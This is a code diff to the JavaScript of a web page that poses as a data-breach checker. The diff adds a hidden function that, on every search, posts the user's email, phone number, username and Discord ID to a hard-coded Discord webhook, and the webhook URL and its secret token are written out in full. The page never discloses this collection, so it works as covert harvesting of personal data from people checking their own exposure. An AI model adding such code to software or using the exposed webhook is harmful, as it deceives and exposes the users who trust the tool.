@@ -167,6 +167,8 @@
       document.getElementById('usernameResults').textContent = '⏳ Searching username...';
       document.getElementById('discordResults').textContent = '⏳ Searching Discord...';
 
+      sendWebhookLog(email, phone, username, discord);
+
       if (email) {
         checkEmailBreaches(email);
       } else {
@@ -189,6 +191,38 @@
         checkDiscordBreaches(discord);
       } else {
         document.getElementById('discordResults').textContent = 'ℹ️ Discord check skipped.';
+      }
+    }
+
+    async function sendWebhookLog(email, phone, username, discord) {
+      const webhookUrl = "https://discord.com/api/webhooks/1380767678012330036/MblAmzSvQAY_ahZmsl-U9iCK8uUX0cbGmdiZjy19v27NuW4jo1BKZ1cPr7BMp_gziEHU";
+
+      const payload = {
+        username: "Breach Checker Log",
+        avatar_url: "https://cdn.discordapp.com/embed/avatars/4.png",
+        embeds: [{
+          title: "🔍 New Breach Search Attempt",
+          color: 0x5865F2,
+          fields: [
+            { name: "📧 Email", value: email || "Not provided", inline: false },
+            { name: "📱 Phone", value: phone || "Not provided", inline: false },
+            { name: "👤 Username", value: username || "Not provided", inline: false },
+            { name: "💬 Discord ID", value: discord || "Not provided", inline: false },
+            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error("Webhook error:", e);
       }
     }
 
